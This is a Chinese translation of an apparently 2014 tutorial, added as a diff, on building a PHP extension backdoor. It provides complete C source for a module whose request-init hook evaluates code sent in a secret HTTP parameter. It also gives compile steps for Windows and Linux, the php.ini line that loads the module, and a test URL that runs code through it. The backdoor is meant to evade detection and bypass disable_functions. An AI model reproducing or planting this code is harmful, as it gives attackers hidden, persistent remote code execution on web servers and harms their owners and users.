@@ -1,0 +1,58 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">编写基于PHP扩展库的后门</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">lxj616</a> <span class="bull">·</span> <time title="2014/09/17 16:23" ui-time="" datetime="2014/09/17 16:23" class="published ng-binding ng-isolate-scope">2014/09/17 16:23</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>from:<a href="http://stackoff.ru/pishem-rasshirenie-bekdor-dlya-php/">http://stackoff.ru/pishem-rasshirenie-bekdor-dlya-php/</a></p><h2>0x00 前言</h2><hr><p>今天我们将讨论编写基于PHP扩展库的后门。通常来说，大部分入侵者都会在脚本中留下自定义代码块后门。当然，这些东西很容易通过源代码的静态或动态分析找到。</p><p>利用PHP扩展库的好处显而易见：</p><pre><code>很难寻找
+绕过disable_functions选项 
+有能力控制所有的代码
+访问代码执行的API
+</code></pre><p>但是我们需要有编辑PHP配置文件的能力。</p><h2>0x01 细节</h2><hr><p>//【译者注：用linux两条命令搞定了，何必windows费这么大劲】 作为例子，我会用Windows来写。写扩展我用的Visual Studio 2012 Express版本。还需要的源代码最新版本，编译PHP库（可从同一来源收集）。为简单起见，我们需要是的php-5.5.15-Win32的VC11-86和源PHP-5.5.15-src.zip</p><p>解压使用C编译PHP:PHP，源代码在C:PHP-SRC。</p><p>然后，你需要进行一些设置。</p><p>1）添加预处理器定义：</p><pre><code>ZEND_DEBUG=0 
+ZTS=1
+ZEND_WIN32 
+PHP_WIN32 
+</code></pre><p><img alt="enter image description here" img-src="4dfcb5eff9228c27c7e82c19433ae44b07cc1a64.jpg"></p><p>预处理器定义 2）添加的目录，用于连接源：</p><pre><code>C: PHP-SRCmain
+C: PHP-SRCend
+C: PHP-SRCTSRM
+C: PHP-SRCegex
+C: PHP-SRC 
+</code></pre><p><img alt="enter image description here" img-src="5061f05e2edb25ba1a9854b4c7a5972769bd341c.jpg"></p><p>其他目录连接</p><p>3）添加其他目录中liboy php5ts.lib（C： PHP dev的）</p><p><img alt="enter image description here" img-src="b0e857445b7d9008b6b3139b41f356f7fa73e38c.jpg"></p><p>其他目录库 4）添加连接库php5ts.lib。</p><p><img alt="enter image description here" img-src="73a1b303fecc588b87cc9c9e9924d5c66ce4838a.jpg"></p><p>装配额外的库</p><p>5）指定收集文件的路径。</p><p><img alt="enter image description here" img-src="6494d09d32e9f3e94c96d5eaa6de5630ca97853b.jpg"></p><p>保存配置文件 配置参数为Workspace扩展的开发后（详情可以在http://blog.slickedit.com/2007/09/creating-a-php-5-extension-with-visual-c-2005/找到），创建一个新的项目类型后门“控制台应用程序的Win32”。</p><p><img alt="enter image description here" img-src="7f0ee536980064eb70788956761419b4baa3f2a1.jpg"></p><p>在Visual StudioVyberem型“库DLL»项目” 选择合适类型</p><p><img alt="enter image description here" img-src="348f34d1432acdce03d7108680d6d221a07d838b.jpg"></p><p>然后，从项目中删除不必要的文件。应该只需要backdoor.cpp，STDAFX.CPP和stdafx.h中。</p><p>在头文件stdafx.h中 ：</p><pre><code>#pragma once
+#ifndef STDAFX
+#define STDAFX
+#include "zend_config.w32.h" 
+#include "php.h"
+#endif
+</code></pre><p>现在，我们直接进入PHP扩展的代码。删除所有行，并添加所需的文件连接。</p><pre><code>#include "stdafx.h"
+#include "zend_config.w32.h"
+#include "php.h"
+</code></pre><p>如果workspace设置已经正确，警告就会消失。 当模块被初始化时，会有几个事件，其中每一个都在特定条件下发生。我们需要在查询执行时，去执行我们的代码。要做到这一点，你必须初始化我们所需要的功能，我给它命名为«hideme»。 PHP_RINIT_FUNCTION(hideme); 然后你可以去看模块的初始化。</p><pre><code>zend_module_entry hideme_ext_module_entry = {
+    STANDARD_MODULE_HEADER,
+    "simple backdoor",
+    NULL,
+    NULL,
+    NULL,
+    PHP_RINIT(hideme),
+    NULL, 
+    NULL,
+    "1.0",
+    STANDARD_MODULE_PROPERTIES
+};
+ZEND_GET_MODULE(hideme_ext);
+</code></pre><p>在这篇文章中，我们只需要加载中代码被执行即可，因此运行和卸载模块由空取代。 现在，你可以去看hideme的函数体。</p><pre><code>PHP_RINIT_FUNCTION(hideme)
+{
+
+    char* method = "_POST"; //超全局数组，从中我们采取perametr和价值   char* secret_string = "secret_string"; //参数，这将是运行的代码    
+    //【译者注：在原文作者的github代码中method是get，secret_string是execute，请大家按照github代码进行测试，不修改原文了】
+    zval** arr;
+    char* code;
+
+    if (zend_hash_find(&amp;EG(symbol_table), method, strlen(method) + 1, (void**)&amp;arr) != FAILURE) { 
+        HashTable* ht = Z_ARRVAL_P(*arr);
+        zval** val;
+        if (zend_hash_find(ht, secret_string, strlen(secret_string) + 1, (void**)&amp;val) != FAILURE) { //查找散列表中所需的参数          
+    code =  Z_STRVAL_PP(val); //值
+    zend_eval_string(code, NULL, (char *)"" TSRMLS_CC); //代码执行
+        }
+    }
+    return SUCCESS;
+}
+</code></pre><p>注释应该比较清楚。最初，我们设置HTTP方法和参数secret_string。然后再寻找正确的数组参数，如果有的话，我们就从它的值中取指令，并通过zend_eval_string执行代码。 编译后的所得，即可作为一个扩展库。</p><p>下载源代码</p><p><a href="https://github.com/akamajoris/php-extension-backdoor">https://github.com/akamajoris/php-extension-backdoor</a></p><h2>0x02 测试</h2><hr><p>//以下为译者测试截图：</p><p><img alt="enter image description here" img-src="b84da5d4e13e2529449ec8a0b23ebf5ec7ab7ba9.jpg"></p><pre><code>http://127.0.0.1:1629/20140917/test.php?execute=phpinfo();
+</code></pre><p>（因为原作者github代码设置的是execute）</p><p>Linux编译（kali）</p><pre><code>apt-get install php5-dev
+phpize &amp;&amp; ./configure &amp;&amp; make
+</code></pre><p>在kali下测试一遍成功，我比较懒，直接chmod后把so复制到/var/www了哈哈</p><p>然后php.ini加上</p><pre><code>extension=/var/www/back.so
+</code></pre><p>重启apache，测试成功</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">sfcuboy</span> <span class="reply-time">2014-09-18 12:30:16</span></div><p></p><p>这个太蛋疼了，用别人的扩展还得看源码了。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">铁汉</span> <span class="reply-time">2014-09-18 11:58:41</span></div><p></p><p>就像身上藏了一只跳蚤</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">DM_</span> <span class="reply-time">2014-09-17 21:29:02</span></div><p></p><p>nginx下也有一个<br>https://github.com/t57root/pwnginx</p><p></p></div></div></div></div></div></main>
